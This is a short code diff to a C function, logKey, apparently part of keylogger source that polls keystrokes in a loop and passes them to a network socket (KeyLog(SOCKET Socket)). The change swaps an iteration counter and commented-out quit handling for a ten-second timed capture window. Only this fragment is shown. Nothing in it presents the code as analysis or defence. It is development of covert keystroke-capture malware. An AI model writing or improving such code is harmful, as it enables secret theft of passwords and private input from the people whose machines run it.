@@ -20,14 +20,11 @@ int KeyLog(SOCKET Socket);
 void logKey(SOCKET Socket){
     FILE *file;
     unsigned short ch=0, i=0, j=0, n=0;
-//	char flag[5];
-	//printf("Input 'q' to quit.\n");
+	time_t a; time(&a);
+	int timeStart = a;
 
-    while(j< 1000 && n < 30){
-	//	if(recv(Socket,flag,1,0) != 0){
-			//flag = getch();
-	//		if(flag[0] == 'q')break;
-	//	}
+    while((a - timeStart) < 10 && n < 30){
+		time(&a);
         ch=1;
         time_t date = time(NULL);
         while(ch<250){
@@ -46,7 +43,7 @@ void logKey(SOCKET Socket){
             }
             Sleep(1); ///take rest
         }
-        j++;
+        
     }
 }
 
